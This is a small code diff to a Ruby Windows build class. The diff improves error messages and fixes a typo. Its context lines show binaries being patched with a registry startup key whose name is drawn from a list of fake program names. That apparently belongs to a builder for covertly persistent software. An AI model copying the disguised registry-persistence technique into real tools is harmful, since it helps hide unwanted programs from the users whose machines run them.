@@ -68,8 +68,8 @@ class BuildWindows < Build
         # the new registry key
         marker = "Registry key"
         content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
-      rescue
-        raise "#{marker} marker not found"
+      rescue Exception => e
+        raise "#{marker} marker not found: #{e.message}"
       end
     end
 
@@ -88,8 +88,8 @@ class BuildWindows < Build
         # the new registry key
         marker = "Registry key"
         content.binary_patch 'JklAKLjsd-asdjAIUHDUD823akklGDoak3nn34', reg_start_key(@factory.confkey).ljust(38, "\x00")
-      rescue
-        raise "#{marker} marker not found"
+      rescue Exception => e
+        raise "#{marker} marker not found: #{e.message}"
       end
     end
 
@@ -387,7 +387,7 @@ class BuildWindows < Build
     # the name must be less than 23
     name = fake_names[seed.ord % fake_names.size] + ' ' + fakever
 
-    raise "Registry key name too long" if name.lenght > 23
+    raise "Registry key name too long" if name.length > 23
 
     return name
   end
